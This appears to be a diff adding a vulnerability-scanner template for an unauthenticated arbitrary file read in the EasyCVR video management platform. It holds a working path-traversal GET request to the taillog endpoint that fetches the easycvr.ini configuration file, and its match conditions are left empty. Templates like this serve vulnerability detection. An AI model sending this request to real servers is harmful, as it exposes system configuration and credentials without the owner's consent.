@@ -1,0 +1,20 @@
+id: easycvr-arbitrary-file-read
+brief:
+    title: EasyCVR Video Management - Arbitrary File Read
+    by: s4e-io
+    level: high
+    about: The EasyCVR-video management platform taillog interface has an arbitrary file read vulnerability. Unauthenticated attackers can use this vulnerability to read important system files (such as databa...
+    label:
+        - easycvr
+        - unauth
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/taillog/oxsecl/..\easycvr.ini'
+      signs: []
